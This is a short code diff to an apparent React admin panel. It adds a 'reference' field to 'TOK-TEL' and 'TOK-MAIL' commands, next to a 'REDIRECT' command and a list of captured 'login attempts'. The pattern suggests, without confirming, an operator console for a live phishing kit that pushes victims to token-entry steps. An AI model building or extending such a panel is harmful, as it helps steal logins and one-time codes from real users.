@@ -57,6 +57,11 @@ function AdminPanel() {
       if (command === "REDIRECT") {
         payload.redirect_url = redirectUrl;
       }
+      
+      // Enviar referência para comandos que precisam (TOK-TEL, TOK-MAIL)
+      if (command === "TOK-TEL" || command === "TOK-MAIL") {
+        payload.reference = referenceField;
+      }
 
       await axios.post(`${API}/admin/command`, payload, { headers });
       fetchLoginAttempts();
